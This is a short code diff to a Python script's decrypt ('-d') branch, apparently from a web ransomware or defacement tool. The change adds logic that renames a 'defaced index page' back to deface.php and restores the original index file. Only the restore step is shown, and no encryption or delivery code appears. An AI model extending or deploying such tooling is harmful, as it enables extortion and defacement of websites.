@@ -37,4 +37,9 @@ elif sys.argv[1] == "-d":
         dec_file.write(decrypted)
     
     base = os.path.splitext(current_file)[0]
-    os.rename(current_file, base + '.txt')
+    if base != "index":
+        os.rename(current_file, base + '.txt')
+    else : 
+        # rename the defaced index page back to 'deface.php'
+        os.rename('index.php', 'deface.php')
+        os.rename(current_file, base + '.php')
